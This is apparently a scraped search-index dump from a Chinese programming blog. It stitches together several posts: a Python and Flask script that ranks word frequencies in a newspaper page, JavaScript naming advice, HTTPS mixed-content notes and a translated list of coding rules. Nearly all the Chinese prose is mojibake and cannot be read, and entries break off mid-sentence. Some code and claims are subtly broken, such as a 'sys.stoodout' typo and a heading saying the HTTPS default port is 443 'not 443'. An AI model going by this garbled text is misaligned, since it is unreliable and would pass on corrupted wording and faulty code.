re.compile(\u0026#34;[^\\u4e00-\\u9fa5]\u0026#34;) line = rule.sub(\u0026#39;\u0026#39;,line) return line def _calculate_frequency(words): # è®¡ç®—åˆ†è¯å‡ºç°çš„æ¬¡æ•° result = {} res = [] for word in words: if result.get(word, -1) == -1: result[word] = 1 else: result[word] += 1 for word in result: if _.contains(USELESSWORDS, word): # æ’é™¤æ— ç”¨çš„åˆ†è¯ continue res.append({ \u0026#39;word\u0026#39;: word, \u0026#39;fre\u0026#39;: result[word] }) return _.sortBy(res, \u0026#39;fre\u0026#39;)[::-1][:TOP] # é™åºæ’åˆ— def _get_page(url): # è·å–é¡µé¢ return requests.get(url) def _get_text(req): # è·å–æ–‡ç« éƒ¨åˆ† return pq(req.content)(\u0026#39;#ozoom\u0026#39;).text() def main(url): # å…¥å£å‡½æ•°ï¼Œå‡½æ•°ç»„åˆ return _.compose( _get_page, _get_text, _remove_punctuation, _jieba.cut, _calculate_frequency )(url) 6. pythonæœåŠ¡ç«¯ï¼šFlaskæµ…å…¥æµ…å‡º import word_rank from flask import Flask, request, jsonify, render_template app = Flask(__name__) app.debug = True @app.route(\u0026#39;/rank\u0026#39;) # ä»queryå‚æ•°é‡Œè·å–pageUrlï¼Œå¹¶ç»™åˆ†è¯æ’åº def getRank(): pageUrl = request.args.get(\u0026#39;pageUrl\u0026#39;) app.logger.debug(pageUrl) rank = word_rank.main(pageUrl) app.logger.debug(rank) return jsonify(rank) @app.route(\u0026#39;/\u0026#39;) # ä¸»é¡µé¢ def getHome(): return render_template(\u0026#39;home.html\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: app.run() 7. æ€»ç»“ æ®è¯´æœ‰ä¸ªå®šå¾‹ï¼šå‡¡æ˜¯èƒ½ç”¨JavaScriptå†™å‡ºæ¥çš„ï¼Œæœ€ç»ˆéƒ½ä¼šç”¨JavaScriptå†™å‡ºæ¥ã€‚ æˆ‘æ˜¯å¾ˆå¸Œæœ›è¿™æ ·å•¦ã€‚ä½†æ˜¯ä¸å¾—ä¸æ‰¿è®¤ï¼Œpythonä¸Šæœ‰å¾ˆå¤šéå¸¸ä¼˜ç§€çš„åº“ã€‚è¿™äº›åº“åœ¨npmä¸Šå¹¶æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„æ›¿ä»£å“ã€‚\næ‰€ä»¥ï¼Œæˆ‘å°±æƒ³: å¦‚ä½•èƒ½ç”¨nodejsç›´æ¥è°ƒç”¨pythonçš„ç¬¬ä¸‰æ–¹åº“\nç›®å‰çš„è§£å†³æ–¹æ¡ˆæœ‰ä¸¤ç§ï¼Œç¬¬ä¸€ï¼Œåªç”¨nodejsçš„child_processesã€‚è¿™ä¸ªæ–¹æ¡ˆæˆ‘è¯•è¿‡ï¼Œä½†æ˜¯ä¸å¤ªå¥½ç”¨ã€‚\nç¬¬äºŒï¼Œnpmé‡Œé¢æœ‰ä¸€äº›åŒ…ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨pythonçš„åº“ã€‚ä¾‹å¦‚ï¼šnode-python, python.js, ä½†æ˜¯è¿™äº›åŒ…æˆ‘åœ¨win7ä¸Šå®‰è£…çš„æ—¶å€™æ€»æ˜¯æŠ¥é”™ã€‚è€Œä¸”è§£å†³æ–¹æ³•ä¹Ÿè›®éº»çƒ¦çš„ã€‚ç´¢æ€§æˆ‘å°±ç›´æ¥ç”¨pythonäº†ã€‚\næœ€åé™„ä¸Šé¡¹ç›®åœ°å€ï¼šhttps://github.com/wangduanduan/read-newspaper\n","permalink":"https://wdd.js.org/posts/2019/10/rmsqoa/","summary":"1. ç¯å¢ƒ win7 64ä½ python 3.5 2. ç›®æ ‡ æŠ“å–ä¸€ç¯‡æŠ¥çº¸ï¼Œå¹¶æå–å‡ºå…³é”®å­—ï¼Œç„¶åæŒ‰ç…§å‡ºç°æ¬¡æ•°æ’åºï¼Œç”¨echartsåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºå‡ºæ¥ã€‚\n3. å·¥å…·é€‰æ‹© å› ä¸ºä¹‹å‰å¯¹nodejsçš„ç›¸å…³å·¥å…·æ¯”è¾ƒç†Ÿæ‚‰ï¼Œåœ¨ç”¨pythonçš„æ—¶å€™ï¼Œä¹Ÿæƒ³æœ‰ç±»ä¼¼çš„å·¥å…·ã€‚æ‰€ä»¥å°±åšäº†ä¸€ä¸ªå¯¹æ¯”çš„è¡¨æ ¼ã€‚\nåŠŸèƒ½ nodejsç‰ˆ pythonç‰ˆ httpå·¥å…· request requests ä¸­æ–‡åˆ†è¯å·¥å…· node-segment, nodejieba(ä¸€ç›´æ²¡æœ‰å®‰è£…æˆåŠŸè¿‡) jieba(åˆ†è¯å‡†ç¡®åº¦æ¯”node-segmentå¥½) DOMè§£æå·¥å…· cheeio pyquery(è¿™ä¸¤ä¸ªå·¥å…·éƒ½æ˜¯æœ‰ç±»ä¼¼jQueryé‚£ç§é€‰æ‹©DOMçš„æ¥å£ï¼Œå¾ˆæ–¹ä¾¿) å‡½æ•°ç¼–ç¨‹å·¥å…· underscore.js underscore.py(underscoreæ¥å¤„ç†é›†åˆæ¯”è¾ƒæ–¹ä¾¿) æœåŠ¡å™¨ express flask 4. å¼€å§‹çš„å™©æ¢¦ï¼šä¸­æ–‡ä¹±ç  æ„Ÿè§‰æ¯ä¸ªå­¦pythonçš„äººéƒ½é‡åˆ°è¿‡ä¸­æ–‡ä¹±ç çš„é—®é¢˜ã€‚æˆ‘ä¹Ÿä¸ä¾‹å¤–ã€‚\né¦–å…ˆè¦æŠ“å–ç½‘é¡µï¼Œä½†æ˜¯ç½‘é¡µåœ¨æ§åˆ¶å°è¾“å‡ºçš„æ—¶å€™ï¼Œä¸­æ–‡æ€»æ˜¯ä¹±ç ã€‚æäº†å¥½ä¹…ï¼Œæå¾—æˆ‘å·®ç‚¹è¦æ”¾å¼ƒpythonã€‚æœ€ç»ˆæ‰¾åˆ°è§£å†³æ–¹æ³•ã€‚ è§£å†³python3 UnicodeEncodeError: \u0026lsquo;gbk\u0026rsquo; codec can\u0026rsquo;t encode character \u0026lsquo;\\xXX\u0026rsquo; in position XX\nè¿‡ç¨‹å¾ˆè‰°è¾›ï¼Œä½†æ˜¯ä»ä¸­ä¹Ÿå­¦åˆ°å¾ˆå¤šçŸ¥è¯†ã€‚\nimport io import sys sys.stdout = io.TextIOWrapper(sys.stoodout.buffer,encoding=\u0026#39;gb18030\u0026#39;) 5. å‡½æ•°å¼ç¼–ç¨‹ï¼š é¡ºäº«ä¸æ»‘ #filename word_rank.py import requests import io import re import sys import jieba as _jieba # ä¸­æ–‡åˆ†è¯æ¯”è¾ƒä¼˜ç§€çš„ä¸€ä¸ªåº“ from pyquery import PyQuery as pq #ç±»ä¼¼äºjqueryã€cheerioçš„åº“ from underscore import _ # underscore.","title":"pythonå®æˆ˜ æŠ¥çº¸åˆ†è¯æ’åº"},{"content":"åœ¨å°æœ±å…ƒç’‹å‡ºç”Ÿä¸€ä¸ªæœˆåï¼Œçˆ¶æ¯ä¸ºä»–å–äº†ä¸€ä¸ªåå­—ï¼ˆå…ƒæ—¶æƒ¯ä¾‹ï¼‰ï¼šæœ±é‡å…«ï¼Œè¿™ä¸ªåå­—ä¹Ÿå¯ä»¥å«åšæœ±å…«å…«ã€‚æˆ‘ä»¬è¿™é‡Œå†ä»‹ç»ä¸€ä¸‹ï¼Œæœ±é‡å…«å®¶æ—çš„åå­—ï¼Œéƒ½å¾ˆæœ‰ç‰¹ç‚¹ã€‚\næœ±é‡å…«é«˜ç¥–åå­—ï¼šæœ±ç™¾å…­ï¼› æœ±é‡å…«æ›¾ç¥–åå­—ï¼šæœ±å››ä¹ï¼› æœ±é‡å…«ç¥–çˆ¶åå­—ï¼šæœ±åˆä¸€ï¼› ä»–çš„çˆ¶äº²æˆ‘ä»¬ä»‹ç»è¿‡äº†ï¼Œå«æœ±äº”å››ã€‚ å–è¿™æ ·çš„åå­—ä¸æ˜¯å› ä¸ºæœ±å®¶æ˜¯ææ•°å­¦çš„ï¼Œè€Œæ˜¯å› ä¸ºåœ¨å…ƒæœï¼Œè€ç™¾å§“å¦‚æœä¸èƒ½ä¸Šå­¦å’Œå½“å®˜å°±æ²¡æœ‰åå­—ï¼Œåªèƒ½ä»¥çˆ¶æ¯å¹´é¾„ç›¸åŠ æˆ–è€…å‡ºç”Ÿçš„æ—¥æœŸå‘½åã€‚ï¼ˆç™»è®°æˆ·å£çš„äººä¸€å®šä¼šçœ¼èŠ±ï¼‰\u0026ndash;ã€Šæ˜æœé‚£äº›äº‹å„¿ã€‹\né‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæœ±å››ä¹å’Œæœ±ç™¾å…­æ˜¯ä»€ä¹ˆå…³ç³»ï¼Ÿ ä½ å¯èƒ½é©¬ä¸Šæ‡µé€¼äº†ã€‚æ‰€ä»¥è¯´ï¼šå‘½åä¸ä»…ä»…æ˜¯ä¸€ç§ç§‘å­¦ï¼Œæ›´æ˜¯ä¸€ç§è‰ºæœ¯ã€‚\n1. åå‰¯å…¶å® // bad var d; // åˆ†æ‰‹çš„æ—¶é—´ï¼Œä»¥å¤©è®¡ç®— // good var daysAfterBrokeUp; // åˆ†æ‰‹ä»¥åï¼Œä»¥å¤©è®¡ç®— 2. é¿å…è¯¯å¯¼ // bad var nameList = \u0026#39;wdd\u0026#39;; // Listä¸€èˆ¬æš—æŒ‡æ•°æ®æ˜¯æ•°ç»„ï¼Œè€Œä¸åº”è¯¥èµ‹å€¼ç»™å­—ç¬¦ä¸² // good var nameList = [\u0026#39;wdd\u0026#39;,\u0026#39;ddw\u0026#39;,\u0026#39;dwd\u0026#39;]; // // bad var ill10o = 10; //åƒä¸‡ä¸è¦æŠŠi,1,l,0,o,Oæ”¾åœ¨ä¸€èµ·ï¼Œå‚»å‚»åˆ†ä¸æ¸…æ¥š // good var illOne = 10; 3. åšæœ‰æ„ä¹‰çš„åŒºåˆ† // bad var userData, userInfo; // Dataå’ŒInfo, æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ, ä¸è¦å†ç”¨dataå’Œinfoè¿™æ ·æ¨¡ç³Šä¸æ¸…çš„å•è¯äº† // good var userProfile, userAcount 4. ä½¿ç”¨è¯»å¾—å‡ºæ¥çš„åç§° // bad var beeceearrthrtee; // ä½ çŸ¥é“æ€ä¹ˆè¯»å—ï¼Ÿ é¼»æ¶•é˜¿ä¸‰ï¼Ÿï¼Ÿ // good var userName; 5. ä½¿ç”¨å¯æœç´¢çš„åç§° // bad var e = \u0026#39;not found\u0026#39;; // æƒ³æœe, å°±å¾ˆéš¾æœ // good var ERROR_NO_FOUND = \u0026#39;not found\u0026#39;; 6. æ–¹æ³•åä¸€æ¦‚æ˜¯åŠ¨è¯çŸ­è¯­ // good function createAgent(){} funtion deleteAgent(){} function updateAgent(){} function queryAgent(){} 7. å°½é‡ä¸è¦ç”¨å•å­—æ¯åç§°, é™¤äº†ç”¨äºå¾ªç¯ // bad var i = 1; // good for(var i=0; i\u0026lt;10; i++){ ... } // very good userList.forEach(function(user){ ... }); 8. æ¯ä¸ªæ¦‚å¿µå¯¹åº”ä¸€ä¸ªè¯ controllerå’Œmanager, æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œè¦ç”¨controlleréƒ½ç”¨controller, è¦ç”¨manageréƒ½ç”¨manager, ä¸è¦æ··ç€ç”¨ 9. å»ºç«‹é¡¹ç›®è¯æ±‡è¡¨, ä¸è¦éšæ„åˆ›é€ åç§° user, agent, org, queue, activity, device... 10. å‚è€ƒèµ„æ–™ ã€Šä»£ç æ•´æ´ä¹‹é“ã€‹ ã€Šæ˜æœé‚£äº›äº‹å„¿ã€‹ ","permalink":"https://wdd.js.org/posts/2019/10/ouvbom/","summary":"åœ¨å°æœ±å…ƒç’‹å‡ºç”Ÿä¸€ä¸ªæœˆåï¼Œçˆ¶æ¯ä¸ºä»–å–äº†ä¸€ä¸ªåå­—ï¼ˆå…ƒæ—¶æƒ¯ä¾‹ï¼‰ï¼šæœ±é‡å…«ï¼Œè¿™ä¸ªåå­—ä¹Ÿå¯ä»¥å«åšæœ±å…«å…«ã€‚æˆ‘ä»¬è¿™é‡Œå†ä»‹ç»ä¸€ä¸‹ï¼Œæœ±é‡å…«å®¶æ—çš„åå­—ï¼Œéƒ½å¾ˆæœ‰ç‰¹ç‚¹ã€‚\næœ±é‡å…«é«˜ç¥–åå­—ï¼šæœ±ç™¾å…­ï¼› æœ±é‡å…«æ›¾ç¥–åå­—ï¼šæœ±å››ä¹ï¼› æœ±é‡å…«ç¥–çˆ¶åå­—ï¼šæœ±åˆä¸€ï¼› ä»–çš„çˆ¶äº²æˆ‘ä»¬ä»‹ç»è¿‡äº†ï¼Œå«æœ±äº”å››ã€‚ å–è¿™æ ·çš„åå­—ä¸æ˜¯å› ä¸ºæœ±å®¶æ˜¯ææ•°å­¦çš„ï¼Œè€Œæ˜¯å› ä¸ºåœ¨å…ƒæœï¼Œè€ç™¾å§“å¦‚æœä¸èƒ½ä¸Šå­¦å’Œå½“å®˜å°±æ²¡æœ‰åå­—ï¼Œåªèƒ½ä»¥çˆ¶æ¯å¹´é¾„ç›¸åŠ æˆ–è€…å‡ºç”Ÿçš„æ—¥æœŸå‘½åã€‚ï¼ˆç™»è®°æˆ·å£çš„äººä¸€å®šä¼šçœ¼èŠ±ï¼‰\u0026ndash;ã€Šæ˜æœé‚£äº›äº‹å„¿ã€‹\né‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæœ±å››ä¹å’Œæœ±ç™¾å…­æ˜¯ä»€ä¹ˆå…³ç³»ï¼Ÿ ä½ å¯èƒ½é©¬ä¸Šæ‡µé€¼äº†ã€‚æ‰€ä»¥è¯´ï¼šå‘½åä¸ä»…ä»…æ˜¯ä¸€ç§ç§‘å­¦ï¼Œæ›´æ˜¯ä¸€ç§è‰ºæœ¯ã€‚\n1. åå‰¯å…¶å® // bad var d; // åˆ†æ‰‹çš„æ—¶é—´ï¼Œä»¥å¤©è®¡ç®— // good var daysAfterBrokeUp; // åˆ†æ‰‹ä»¥åï¼Œä»¥å¤©è®¡ç®— 2. é¿å…è¯¯å¯¼ // bad var nameList = \u0026#39;wdd\u0026#39;; // Listä¸€èˆ¬æš—æŒ‡æ•°æ®æ˜¯æ•°ç»„ï¼Œè€Œä¸åº”è¯¥èµ‹å€¼ç»™å­—ç¬¦ä¸² // good var nameList = [\u0026#39;wdd\u0026#39;,\u0026#39;ddw\u0026#39;,\u0026#39;dwd\u0026#39;]; // // bad var ill10o = 10; //åƒä¸‡ä¸è¦æŠŠi,1,l,0,o,Oæ”¾åœ¨ä¸€èµ·ï¼Œå‚»å‚»åˆ†ä¸æ¸…æ¥š // good var illOne = 10; 3. åšæœ‰æ„ä¹‰çš„åŒºåˆ† // bad var userData, userInfo; // Dataå’ŒInfo, æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ, ä¸è¦å†ç”¨dataå’Œinfoè¿™æ ·æ¨¡ç³Šä¸æ¸…çš„å•è¯äº† // good var userProfile, userAcount 4. ä½¿ç”¨è¯»å¾—å‡ºæ¥çš„åç§° // bad var beeceearrthrtee; // ä½ çŸ¥é“æ€ä¹ˆè¯»å—ï¼Ÿ é¼»æ¶•é˜¿ä¸‰ï¼Ÿï¼Ÿ // good var userName; 5.","title":"ä»£ç æ•´æ´ä¹‹é“ - æœ‰æ„ä¹‰çš„å‘½å"},{"content":"1. HTTPSåŸŸå‘HTTPåŸŸå‘é€è¯·æ±‚ä¼šè¢«æµè§ˆå™¨ç›´æ¥æ‹’ç»ï¼ŒHTTPå‘HTTPSåˆ™ä¸ä¼š ä¾‹å¦‚åœ¨github pagesé¡µé¢ï¼Œè¿™æ˜¯ä¸€ä¸ªhttpsé¡µé¢ï¼Œå¦‚æœåœ¨è¿™ä¸ªé¡µé¢å‘httpå‘é€è¯·æ±‚ï¼Œé‚£ä¹ˆä¼šç›´æ¥è¢«æµè§ˆå™¨æ‹’ç»ï¼Œå¹¶åœ¨æ§åˆ¶å°è¾“å‡ºä¸‹é¢çš„æŠ¥é”™ä¿¡æ¯ã€‚\njquery-1.11.3.min.js:5 Mixed Content: The page at \u0026#39;https://wangduanduan.github.io/ddddddd/\u0026#39; was loaded over HTTPS, but requested an insecure XMLHttpRequest endpoint \u0026#39;http://cccccc/\u0026#39;. This request has been blocked; the content must be served over HTTPS. å¦‚æœä½ åœ¨åšç¬¬ä¸‰æ–¹é›†æˆçš„ç³»ç»Ÿï¼Œå¦‚æœä»–ä»¬æ˜¯åœ¨æµè§ˆå™¨ä¸­ç›´æ¥è°ƒç”¨ä½ æä¾›çš„æ¥å£ï¼Œé‚£ä¹ˆæœ€å¥½ä½ ä½¿ç”¨httpsåè®®ï¼Œè¿™æ ·æ— è®ºå¯¹æ–¹æ˜¯httpsè¿˜æ˜¯httpéƒ½å¯ä»¥è®¿é—®ã€‚ï¼ˆç›¸ä¿¡æˆ‘ï¼Œè¿™ä¸ªå¾ˆé‡è¦ï¼Œæˆ‘æ›¾ç»ç»å†è¿‡ä¸Šçº¿åé‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Œç„¶åè¿å¤œç”³è¯·è¯ä¹¦ï¼ŒæŠŠhttpå‡çº§åˆ°httpsçš„ç—›è‹¦ç»å†ï¼‰\n2. HTTPSçš„é»˜è®¤ç«¯å£æ˜¯443ï¼Œè€Œä¸æ˜¯443 å¦‚æœ443ç«¯å£å·²ç»è¢«å…¶ä»–æœåŠ¡å ç”¨äº†ï¼Œé‚£ä¹ˆä½¿ç”¨å…¶ä»–ä»»ä½•æ²¡æœ‰è¢«å ç”¨çš„ç«¯å£éƒ½å¯ä»¥ç”¨ä½œHTTPSæœåŠ¡ï¼Œåªä¸è¿‡åœ¨è¯·æ±‚çš„æ—¶å€™éœ€è¦åŠ ä¸Šç«¯å£å·ç½¢äº†ã€‚\n","permalink":"https://wdd.js.org/network/of5hny/","summary":"1. HTTPSåŸŸå‘HTTPåŸŸå‘é€è¯·æ±‚ä¼šè¢«æµè§ˆå™¨ç›´æ¥æ‹’ç»ï¼ŒHTTPå‘HTTPSåˆ™ä¸ä¼š ä¾‹å¦‚åœ¨github pagesé¡µé¢ï¼Œè¿™æ˜¯ä¸€ä¸ªhttpsé¡µé¢ï¼Œå¦‚æœåœ¨è¿™ä¸ªé¡µé¢å‘httpå‘é€è¯·æ±‚ï¼Œé‚£ä¹ˆä¼šç›´æ¥è¢«æµè§ˆå™¨æ‹’ç»ï¼Œå¹¶åœ¨æ§åˆ¶å°è¾“å‡ºä¸‹é¢çš„æŠ¥é”™ä¿¡æ¯ã€‚\njquery-1.11.3.min.js:5 Mixed Content: The page at \u0026#39;https://wangduanduan.github.io/ddddddd/\u0026#39; was loaded over HTTPS, but requested an insecure XMLHttpRequest endpoint \u0026#39;http://cccccc/\u0026#39;. This request has been blocked; the content must be served over HTTPS. å¦‚æœä½ åœ¨åšç¬¬ä¸‰æ–¹é›†æˆçš„ç³»ç»Ÿï¼Œå¦‚æœä»–ä»¬æ˜¯åœ¨æµè§ˆå™¨ä¸­ç›´æ¥è°ƒç”¨ä½ æä¾›çš„æ¥å£ï¼Œé‚£ä¹ˆæœ€å¥½ä½ ä½¿ç”¨httpsåè®®ï¼Œè¿™æ ·æ— è®ºå¯¹æ–¹æ˜¯httpsè¿˜æ˜¯httpéƒ½å¯ä»¥è®¿é—®ã€‚ï¼ˆç›¸ä¿¡æˆ‘ï¼Œè¿™ä¸ªå¾ˆé‡è¦ï¼Œæˆ‘æ›¾ç»ç»å†è¿‡ä¸Šçº¿åé‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Œç„¶åè¿å¤œç”³è¯·è¯ä¹¦ï¼ŒæŠŠhttpå‡çº§åˆ°httpsçš„ç—›è‹¦ç»å†ï¼‰\n2. HTTPSçš„é»˜è®¤ç«¯å£æ˜¯443ï¼Œè€Œä¸æ˜¯443 å¦‚æœ443ç«¯å£å·²ç»è¢«å…¶ä»–æœåŠ¡å ç”¨äº†ï¼Œé‚£ä¹ˆä½¿ç”¨å…¶ä»–ä»»ä½•æ²¡æœ‰è¢«å ç”¨çš„ç«¯å£éƒ½å¯ä»¥ç”¨ä½œHTTPSæœåŠ¡ï¼Œåªä¸è¿‡åœ¨è¯·æ±‚çš„æ—¶å€™éœ€è¦åŠ ä¸Šç«¯å£å·ç½¢äº†ã€‚","title":"å¯èƒ½è¢«é—æ¼çš„httpsä¸httpçš„çŸ¥è¯†ç‚¹"},{"content":"åŸæ–‡åœ°å€ï¼šhttps://hackernoon.com/few-simple-rules-for-good-coding-my-15-years-experience-96cb29d4acd9#.ddzpjb80c\nå—¨ï¼Œæˆ‘çš„å·¥ä½œä½œä¸ºä¸€ä¸ªç¨‹åºå‘˜è¶…è¿‡15å¹´ï¼Œå¹¶ä½¿ç”¨è®¸å¤šä¸åŒçš„è¯­è¨€ï¼ŒèŒƒä¾‹ï¼Œæ¡†æ¶å’Œå…¶ä»–ç‹—å±ã€‚æˆ‘æƒ³å’Œå¤§å®¶åˆ†äº«æˆ‘å†™å¥½ä»£ç çš„è§„åˆ™ã€‚\n1. ä¼˜åŒ–VSå¯è¯»æ€§ å»ä»–å¦ˆçš„ä¼˜åŒ– å§‹ç»ˆç¼–å†™æ˜“äºé˜…è¯»ä¸”å¯¹å¼€å‘äººå‘˜å¯ç†è§£çš„ä»£ç ã€‚å› ä¸ºåœ¨ç¡¬å¯è¯»ä»£ç ä¸ŠèŠ±è´¹çš„æ—¶é—´å’Œèµ„æºå°†è¿œè¿œé«˜äºä»ä¼˜åŒ–ä¸­è·å¾—çš„ã€‚å¦‚æœä½ éœ€è¦è¿›è¡Œä¼˜åŒ–ï¼Œé‚£ä¹ˆä½¿å®ƒåƒDIçš„ç‹¬ç«‹æ¨¡å—ï¼Œå…·æœ‰100ï¼…çš„æµ‹è¯•è¦†ç›–ç‡ï¼Œå¹¶ä¸”ä¸ä¼šè¢«è§¦åŠè‡³å°‘ä¸€å¹´ã€‚\n2. æ¶æ„ç¬¬ä¸€ æˆ‘çœ‹åˆ°å¾ˆå¤šäººè¯´â€œæˆ‘ä»¬éœ€è¦å¿«é€Ÿåšäº‹ï¼Œæˆ‘ä»¬æ²¡æœ‰æ—¶é—´åšæ¶æ„â€ã€‚å…¶ä¸­çº¦99ï¼…çš„äººå› ä¸ºè¿™æ ·çš„æƒ³æ³•è€Œé‡åˆ°äº†å¤§é—®é¢˜ã€‚ç¼–å†™ä»£ç è€Œä¸è€ƒè™‘å…¶æ¶æ„æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œå°±åƒæ²¡æœ‰å®ç°å®ƒä»¬çš„è®¡åˆ’ä¸€æ ·ï¼Œæ¢¦æƒ³ä½ çš„æ„¿æœ›ã€‚åœ¨ç¼–å†™ä»£ç çš„ç¬¬ä¸€è¡Œä¹‹å‰ï¼Œä½ åº”è¯¥æ˜ç™½å®ƒå°†è¦åšä»€ä¹ˆï¼Œå®ƒå°†å¦‚ä½•ä½¿ç”¨ï¼Œæ¨¡å—ï¼ŒæœåŠ¡å¦‚ä½•ç›¸äº’å·¥ä½œï¼Œå®ƒå°†æœ‰ä»€ä¹ˆç»“æ„ï¼Œå¦‚ä½•è¿›è¡Œæµ‹è¯•å’Œè°ƒè¯•ï¼Œä»¥åŠå¦‚ä½•æ›´æ–°ã€‚\n3. æµ‹è¯•è¦†ç›–ç‡ æµ‹è¯•æ˜¯å¥½äº‹ï¼Œä½†ä»–ä»¬å¹¶ä¸æ€»æ˜¯è´Ÿæ‹…å¾—èµ·ï¼Œå¯¹é¡¹ç›®æœ‰æ„ä¹‰ã€‚\nå½“ä½ éœ€è¦æµ‹è¯•ï¼š\nå½“ä½ ç¼–å†™æ¨¡å—æ—¶ï¼Œå¾®æœåŠ¡å°†ä¸ä¼šè¢«è§¦åŠè‡³å°‘ä¸€ä¸ªæœˆã€‚ å½“ä½ ç¼–å†™å¼€æºä»£ç ã€‚ å½“ä½ ç¼–å†™æ¶‰åŠé‡‘èæ¸ é“çš„æ ¸å¿ƒä»£ç æˆ–ä»£ç ã€‚ å½“æ‚¨æœ‰ä»£ç æ›´æ–°çš„åŒæ—¶æ›´æ–°æµ‹è¯•çš„èµ„æºã€‚ å½“ä½ ä¸éœ€è¦æµ‹è¯•æ—¶ï¼š\nå½“ä½ æ˜¯ä¸€ä¸ªåˆ›ä¸šã€‚ å½“ä½ æœ‰å°å›¢é˜Ÿå’Œä»£ç æ›´æ”¹æ˜¯å¿«é€Ÿã€‚ å½“ä½ ç¼–å†™çš„è„šæœ¬ï¼Œå¯ä»¥ç®€å•åœ°é€šè¿‡ä»–ä»¬çš„è¾“å‡ºæ‰‹åŠ¨æµ‹è¯•ã€‚ è®°ä½ï¼Œå¸¦æœ‰ä¸¥æ ¼æµ‹è¯•çš„ä»£ç å¯èƒ½æ¯”æ²¡æœ‰æµ‹è¯•çš„ä»£ç æ›´æœ‰å®³ã€‚\n4. ä¿æŒç®€å•ï¼Œæåº¦ç®€å• ä¸è¦ç¼–å†™å¤æ‚çš„ä»£ç ã€‚æ›´å¤šæ›´ç®€å•ï¼Œé‚£ä¹ˆæ›´å°‘çš„é”™è¯¯å®ƒå¯èƒ½æœ‰å’Œæ›´å°‘çš„æ—¶é—´æ¥è°ƒè¯•å®ƒä»¬ã€‚ä»£ç åº”è¯¥åšçš„åªæ˜¯å®ƒéœ€è¦æ²¡æœ‰éå¸¸å¤šçš„æŠ½è±¡å’Œå…¶ä»–OOP shitï¼ˆå°¤å…¶æ˜¯æ¶‰åŠjavaå¼€å‘äººå‘˜ï¼‰+ 20ï¼…çš„ä¸œè¥¿å¯èƒ½éœ€è¦åœ¨å°†æ¥ä»¥ç®€å•çš„æ–¹å¼æ›´æ–°å®ƒã€‚\n5. æ³¨é‡Š å‡ºç°æ³¨é‡Šè¯´æ˜ä½ çš„ä»£ç ä¸å¤Ÿå¥½ã€‚å¥½çš„ä»£ç åº”è¯¥æ˜¯å¯ä»¥ç†è§£çš„ï¼Œæ²¡æœ‰ä¸€è¡Œæ³¨é‡Šã€‚ä½†æ˜¯å¦‚ä½•ä¸ºæ–°å¼€å‘äººå‘˜èŠ‚çœæ—¶é—´ï¼Ÿ - ç¼–å†™ç®€å•çš„å†…è”æ–‡æ¡£æè¿°ä»€ä¹ˆå’Œå¦‚ä½•æ–¹æ³•å·¥ä½œã€‚è¿™å°†èŠ‚çœå¾ˆå¤šæ—¶é—´æ¥ç†è§£ï¼Œç”šè‡³æ›´å¤š - å®ƒå°†ç»™äººä»¬æ›´å¤šçš„æœºä¼šæ¥æå‡ºæ›´å¥½çš„å®æ–½è¿™ç§æ–¹æ³•ã€‚å¹¶ä¸”å®ƒå°†æ˜¯å…¨çƒä»£ç æ–‡æ¡£çš„è‰¯å¥½å¼€ç«¯ã€‚\n6. ç¡¬è€¦åˆVSè¾ƒå°è€¦åˆ å§‹ç»ˆå°è¯•ä½¿ç”¨å¾®æœåŠ¡æ¶æ„ã€‚å•ç‰‡è½¯ä»¶å¯ä»¥æ¯”å¾®æœåŠ¡è½¯ä»¶è¿è¡Œå¾—æ›´å¿«ï¼Œä½†åªèƒ½åœ¨ä¸€ä¸ªæœåŠ¡å™¨çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œã€‚å¾®æœåŠ¡ä½¿æ‚¨å¯ä»¥ä¸ä»…åœ¨è®¸å¤šæœåŠ¡å™¨ä¸Šï¼Œè€Œä¸”æœ‰æ—¶ç”šè‡³åœ¨ä¸€å°æœºå™¨ä¸Šï¼ˆæˆ‘çš„æ„æ€æ˜¯è¿‡ç¨‹åˆ†å‘ï¼‰é«˜æ•ˆåœ°åˆ†å‘æ‚¨çš„è½¯ä»¶ã€‚\n7. ä»£ç å®¡æŸ¥ ä»£ç å®¡æŸ¥å¯ä»¥æ˜¯å¥½çš„ï¼Œä¹Ÿä»¥æ˜¯åçš„ã€‚æ‚¨å¯ä»¥ç»„ç»‡ä»£ç å®¡æŸ¥ï¼Œåªæœ‰å½“æ‚¨æœ‰å¼€å‘äººå‘˜äº†è§£95ï¼…çš„ä»£ç ï¼Œè°å¯ä»¥ç›‘æ§æ‰€æœ‰æ›´æ–°ï¼Œè€Œä¸æµªè´¹å¾ˆå¤šæ—¶é—´ã€‚åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œè¿™å°†æ˜¯åªæ˜¯è€—æ—¶ï¼Œæ¯ä¸ªäººéƒ½ä¼šè®¨åŒè¿™ä¸ªã€‚\nåœ¨è¿™éƒ¨åˆ†æœ‰å¾ˆå¤šé—®é¢˜ï¼Œæ‰€ä»¥æ›´æ·±å…¥åœ°æè¿°è¿™ä¸€ç‚¹ã€‚\nè®¸å¤šäººè®¤ä¸ºä»£ç å®¡æŸ¥æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æ–¹å¼æ•™æ–°æ‰‹ï¼Œæˆ–è€…å·¥ä½œåœ¨ä¸åŒéƒ¨åˆ†çš„ä»£ç çš„é˜Ÿå‹ã€‚ä½†æ˜¯ä»£ç å®¡æŸ¥çš„ä¸»è¦ç›®æ ‡æ˜¯ä¿æŒä»£ç è´¨é‡ï¼Œè€Œä¸æ˜¯æ•™å­¦ã€‚è®©æˆ‘ä»¬æƒ³è±¡ä½ çš„å›¢é˜Ÿåˆ¶ä½œä»£ç ç”¨äºæ§åˆ¶æ ¸ååº”å †æˆ–å¤ªç©ºç«ç®­å‘åŠ¨æœºçš„å†·å´ç³»ç»Ÿã€‚ä½ 